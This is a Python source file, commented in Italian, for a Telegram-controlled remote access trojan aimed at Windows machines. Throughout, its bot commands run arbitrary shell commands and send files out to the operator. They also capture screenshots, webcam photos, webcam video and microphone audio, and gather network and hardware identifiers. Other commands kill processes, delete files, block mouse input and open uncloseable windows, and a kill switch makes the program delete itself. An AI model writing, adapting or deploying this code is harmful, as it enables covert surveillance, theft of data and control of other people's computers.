from tkinter import messagebox
import tkinter
import os
import time
import tkinter as tk
from tkinter import *
from tkinter.ttk import *
from tkinter import ttk
import botogram
import cv2
import pyautogui
import subprocess
import psutil
import time
import platform
from datetime import datetime
from ctypes import *
import ctypes
import speech_recognition as sr
import socket
import requests
import uuid
from sys import argv
from pynput.keyboard import Key, Controller
import win32console, win32gui, win32con
import winreg as reg  

#The_program_to_hide = win32gui.GetForegroundWindow()
#win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE) ###############rende invisibile la shell
def disable_event():
        pass


def checkIfProcessRunning(processName): ############funzione per cercare un processso
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;




bot = botogram.create("")
@bot.command("Kill_switch")#############Con questo comando eliminerai questo bot completamente##############
def kill_switch(chat,message):
    x=open("kill_switch.key","w+")
    x.close()
@bot.timer(2)
def timera(bot):
    if os.path.exists("kill_switch.key"):
            os.remove(argv[0])
            Premi = Controller()
            Premi.press(Key.ctrl)######chiudi il bot simulando ctrl+c########
            Premi.press('c')
    else:
        pass
@bot.command("extra")###########ricevi informazioni sull ip,il nome del pc,ip del pc,l'indirizzo mac e il processore del pc##########
def extra(chat,message):
    ip = requests.get("https://api.myip.com")
    chat.send ("il tuo ip pubblico ==> " + ip.text)
    hostname = socket.gethostname()    
    IPAddr = socket.gethostbyname(hostname)    
    chat.send("il nome del tuo pc ===> " + hostname)    
    chat.send("l'indirizzo ip del tuo computer ===> " + IPAddr) 
    chat.send ("l'indirizzo mac è : ") 
    chat.send (':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
    for ele in range(0,8*6,8)][::-1]))
    chat.send("il tuo processore è ===> " + platform.processor())
#################crea delle messagebox con il testo che vuoi#####################à
@bot.command("showinfo")
def showinfo(chat,message,args):
    """crea una finestra showinfo con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.showinfo("info",ar)
    root.destroy()
@bot.command("showwarning") 
def showwarning(chat,message,args):
    """crea una finestra showarning con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.showwarning("warning",ar)
    root.destroy()
@bot.command("showerror")
def showeerror(chat,message,args):
    """crea una finestra showerror con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.showerror("ERROR",ar)
    root.destroy()
@bot.command("askquestion") 
def askquestion(chat,message,args):
    """crea una finestra askquestion con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.askquestion("ERROR",ar)
    root.destroy()
@bot.command("askokcancel")
def askok(chat,message,args):
    """crea una finestra askcancel con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.askokcancel("ERROR",ar)
    root.destroy() 
@bot.command("askyesno")
def askyes(chat,message,args):
    """crea una finestra askyesno con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.askyesno("ERROR",ar)
    root.destroy() 
@bot.command("asktrycancel")
def asktrycancel(chat,message,args):
    """crea una finestra asktrycancell con un messaggio personalizzato"""
    ar=" ".join(args)
    root = tkinter.Tk()
    root.withdraw()
    x=messagebox.showinfo("asktrycancel",ar)
    root.destroy()
################fine delle messagebox##################
@bot.command("seefile")############## mostra tutti i pc nella directory selezionata############# 
def see(chat,message,args):
    """mostra tutti i file di una specifica directory se non specificata verrà analizzata la directory attuale"""
    ar="".join(args)
    if ar=="":
        ar= os.getcwd()
        chat.send("cartella non selezionata usermo la cartella su cui ti trovi ora " + str(ar))
    x=os.listdir(ar)
    chat.send(str(x))
@bot.command("VediDirectory")########## vedi la directory attuale################
def directory(chat,message):
    """mostra la directory attuale a causa di un errore se avete usato il comando cambia dovrete utilizzare il comando 2 volte"""
    files = os.getcwd()
    files = str(files)
    chat.send(files)

@bot.command("CambiaDirectory") ############ cambia directory#############
def Cdirectory(chat,message,args):
    """cambia la directory attuale"""
    ar="".join(args)
    chat.send("ti stiamo trasportando a>>> " + ar)
    try:
        files = os.chdir(ar)
        chat.send("cambiata")
    except:
        chat.send("directory non trovata")
@bot.command("Delete") ############ elimina il file selezionato###############
def delete(chat,message,args):
    """elimina uno specifico file"""
    ar="".join(args)
    chat.send("hai eliminato>>> " + ar)
    try:
        os.remove(ar)
        chat.send("eliminato ")
    except:
        chat.send("NON TROVATO")
@bot.command("filedown") ################# fai un download di un file a scelta sul pc###############
def filedown(chat,message,args):
    """scarica un preciso file"""
    ar="".join(args)
    try:
        chat.send_file(ar)
    except:
        chat.send("non trovato")
@bot.command("filesystem") ######## esegue un comando sul cmd#############
def filesystem(chat,message,args):
    """esegue comandi del terminale"""
    ar=" ".join(args)
    os.system(ar)
    chat.send("eseguito")
@bot.command("screen")  ################# fa uno screenshoot #################
def wifi(chat,message):
    """effettua uno screenshot"""
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("name.png")
    chat.send_photo("name.png")
    os.remove("name.png")
@bot.command("foto") ############# fa una foto della webcam###############
def foto(chat,message):
    """fa una foto (webcam)"""
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    img_name = "opencv_frame.png"
    cv2.imwrite(img_name, frame)
    cam.release()
    chat.send_photo("opencv_frame.png")
    os.remove("opencv_frame.png")
@bot.command("video") ######## registra un video della webcam l'audio non è registrato############
def video(chat,message,args):
    """fa un video (webcam) con tempo personalizzato un minuto==1200"""
    ar="".join(args)
    x=int(ar)
    chat.send("registrando")
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('output.avi',fourcc, 20.0, (640,480))
    while(cap.isOpened()):
        ret, frame = cap.read()
        if ret==True:
            frame = cv2.flip(frame,1)
            out.write(frame)
            x=x-1
            if x==0:
                break
        else:
            break
    cap.release()
    out.release()
    cv2.destroyAllWindows()
    chat.send_file("output.avi")
    os.remove("output.avi")
@bot.command("process") ############ controlla se un processo è attivo """"""""""""""
def isonornot(chat,message,args):
    """controllo se uno specifico processo èattivo"""
    ar=" ".join(args)
    if checkIfProcessRunning(ar):
        chat.send("yes")
    else:
        chat.send("no")
@bot.command("kill") ############## uccide uno specifico processo """"""""""""
def kill(chat,message,args):
    """uccidere un determinato processo"""
    ar=" ".join(args)
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    try:
        subprocess.call("taskkill /F /IM " + str(ar), startupinfo=si)
        chat.send("trovato")
    except:
        chat.send("non trovato")

@bot.command("allprocess") ####### manda in un file di testo tutti i processi ######
def allprocess(chat,message):
    """manda in un file di testo tutti i processi attivi"""
    x=open("process.txt","w+")
    x.close()
    x=open("process.txt","a")
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
            processID = proc.pid
            x.write(str(processName) + ' ::: '+ str(processID)+"\n")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    x.close()
    chat.send_file("process.txt")
    os.remove("process.txt")

@bot.command("ascolta") ############# registra l'audio #################
def ascolta(chat,message):
    """avvia una registrazione dell audio"""
    chat.send("microfono attivo attendere")
    recognizer_instance = sr.Recognizer() # Crea una istanza del recognizer
    with sr.Microphone() as source:
        recognizer_instance.adjust_for_ambient_noise(source)
        audio = recognizer_instance.listen(source)
        try:
            texta = recognizer_instance.recognize_google(audio, language="it-IT")
            texta = str(texta)
            chat.send(texta)
        except Exception as e:
            chat.send(e)
@bot.command("mousekill") ############### se è admin blocca il mouse ####################
def mousekill(chat,message):
    """disabilita il mouse solo se è eseguito come amministratore"""
    chat.send("disattivato")
    ok = windll.user32.BlockInput(True)
@bot.command("mouseriable") ##############à riattiva il mouse ################
def riable(chat,message):
    """riattiva il mouse"""
    chat.send("riattivato")
    ok = windll.user32.BlockInput(False)
@bot.command("messaggioinfinestra") ############### crea una finestra inchiudibile :) ########################
def messaggioinfinestra(chat,message,args):
    """crea una finestra(impossibile da chiudere) con un messaggio personalizzato"""
    ar=" ".join(args)
    root=tk.Tk()
    disable_event()
    btn = tk.Button(root, text = ar)
    btn.master.geometry("5000x5000")
    btn.pack()
    root.protocol("WM_DELETE_WINDOW", disable_event)
    root.resizable(False, False)
    root.mainloop()


if __name__ == "__main__":
    bot.run()
